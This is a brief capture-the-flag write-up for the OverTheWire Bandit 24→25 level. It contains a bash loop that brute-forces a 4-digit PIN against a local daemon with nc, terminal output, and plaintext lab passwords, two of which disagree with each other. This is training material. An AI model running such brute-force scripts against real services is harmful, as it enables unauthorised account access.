
## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
## Datos de acceso
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit 24
## Solución

```
```bash
#!/bin/bash

for i in {0000..9999}
do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
```

```
bandit24@bandit:/tmp/tmp.xUjHzjMrvp$ nano brute.sh
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit24@bandit:/tmp/tmp.xUjHzjMrvp$ chmod 777 brute.sh 
bandit24@bandit:/tmp/tmp.xUjHzjMrvp$ ./brute.sh 




The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d


```
## Notas adicionales
Aprendi a usar ciclos en shell
## Referencias
